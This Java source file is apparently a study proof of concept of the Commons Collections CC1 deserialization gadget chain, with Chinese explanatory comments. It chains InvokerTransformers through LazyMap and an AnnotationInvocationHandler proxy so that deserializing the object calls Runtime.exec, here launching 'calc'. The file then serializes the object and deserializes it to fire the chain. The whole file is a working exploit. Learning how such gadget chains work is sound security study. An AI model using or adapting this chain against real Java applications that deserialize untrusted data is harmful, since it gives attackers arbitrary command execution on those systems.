package com.drose.CC1Lazymap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class cc1Lazy {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        // next 记录，2024/12/05 电脑更新的时候被我强制更换电源寄掉了,花了70难受
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //尾部chain
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //获取map
        HashMap<Object,Object> hashMap = new HashMap();
        //调用lazyMap的decorate静态方法，进而调用lazyMap的构造方法，传入chain为factory进行赋值，链接尾部exec
        Map lazyMapForHack = LazyMap.decorate(hashMap, chainedTransformer);
//        lazyMapForHack.get("Dr0se");

//        通过反射获取AnnotationInvocationHandler的构造方法
       Class AnnotationInvocationHandlerRef=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
       Constructor constructor =AnnotationInvocationHandlerRef.getDeclaredConstructor(Class.class,Map.class);
       constructor .setAccessible(true);
        //通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 lazyMapForHack 对象
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, lazyMapForHack);

//创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, instance);
//再次通过反射创建代理对象
        Object o = constructor.newInstance(Override.class, proxyInstance);
        serialize(o);
        unserialize("test.txt");

    }
    //序列化反序列化
    public static void serialize(Object obj) throws IOException, FileNotFoundException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./test.txt"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
